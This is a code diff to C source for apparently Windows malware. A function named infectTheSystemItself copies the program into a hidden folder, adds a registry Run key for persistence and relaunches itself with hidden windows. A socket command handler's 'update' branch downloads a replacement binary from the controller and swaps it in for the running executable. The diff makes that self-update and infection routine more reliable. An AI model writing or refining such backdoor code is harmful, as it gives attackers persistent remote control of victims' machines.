@@ -57,10 +57,10 @@ static void infectTheSystemItself(void)
 	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);
 
 	snprintf(command, 400, "cmd.exe /c mkdir %s", targetPath);
-	WinExec(command, SW_HIDE);
+	WinExec(command, SW_HIDE); Sleep(200);
 
 	snprintf(command, 400, "cmd.exe /c copy %s %s", srcPathwithName, targetPathwithName);
-	WinExec(command, SW_HIDE);
+	WinExec(command, SW_HIDE); Sleep(200);
 
 	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey))
 	{
@@ -79,7 +79,7 @@ static void infectTheSystemItself(void)
 	RegCloseKey(hKey);
 
 	snprintf(command, 400, "cmd.exe /c start %s", targetPathwithName);
-	WinExec(command, SW_HIDE);
+	WinExec(command, SW_HIDE); Sleep(200);
 
 	exit(0);
 }
@@ -164,10 +164,22 @@ static int process(int sckt, char * al)
 	else if (strncmp(al, "update ", 7) == 0)
 	{
 		char command[400 + 1];
-		WinExec("cmd.exe /c rename *.exe old.exe", SW_HIDE);
+		char srcPathwithName[MAX_PATH + 1];
+
+		WinExec("cmd.exe /c del old.exe", SW_HIDE); Sleep(200);
+		GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);
+
+		snprintf(command, 400, "cmd.exe /c rename %s old.exe", srcPathwithName);
+		WinExec(command, SW_HIDE); Sleep(200);
+
 		processFileDownload(sckt, al + 7);
-		snprintf(command, 400, "cmd.exe /c start %s", al + 7);
-		WinExec(command, SW_HIDE);
+
+		snprintf(command, 400, "cmd.exe /c move %s\\MicrosoftTools\\%s %s", getenv("LOCALAPPDATA"), al + 7, srcPathwithName);
+		WinExec(command, SW_HIDE); Sleep(200);
+
+		snprintf(command, 400, "cmd.exe /c start %s", srcPathwithName);
+		WinExec(command, SW_HIDE); Sleep(200);
+
 		exit(0);
 	}
 
